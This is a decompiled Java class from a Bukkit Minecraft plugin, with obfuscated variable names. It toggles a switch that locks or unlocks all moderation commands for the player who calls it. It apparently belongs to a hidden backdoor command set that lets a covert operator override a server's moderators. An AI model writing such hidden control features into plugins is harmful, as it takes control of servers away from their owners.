/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class ModcmdsCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return true;
    }

    @Override
    public void execute(Core lllllllllllllIIlllIlIIlIIlllIlII, String lllllllllllllIIlllIlIIlIIlllIIll, String[] lllllllllllllIIlllIlIIlIIlllIIlI, Player lllllllllllllIIlllIlIIlIIllIllIl) {
        if (lllllllllllllIIlllIlIIlIIlllIlII.modCmd) {
            lllllllllllllIIlllIlIIlIIlllIlII.modCmd = false;
            lllllllllllllIIlllIlIIlIIllIllIl.sendMessage(Settings.PREFIX("All moderation commands are now unlocked"));
        } else {
            lllllllllllllIIlllIlIIlIIlllIlII.modCmd = true;
            lllllllllllllIIlllIlIIlIIllIllIl.sendMessage(Settings.PREFIX("All moderation commands are now locked"));
        }
    }

    public ModcmdsCommand() {
        ModcmdsCommand lllllllllllllIIlllIlIIlIlIIIIIlI;
    }
}

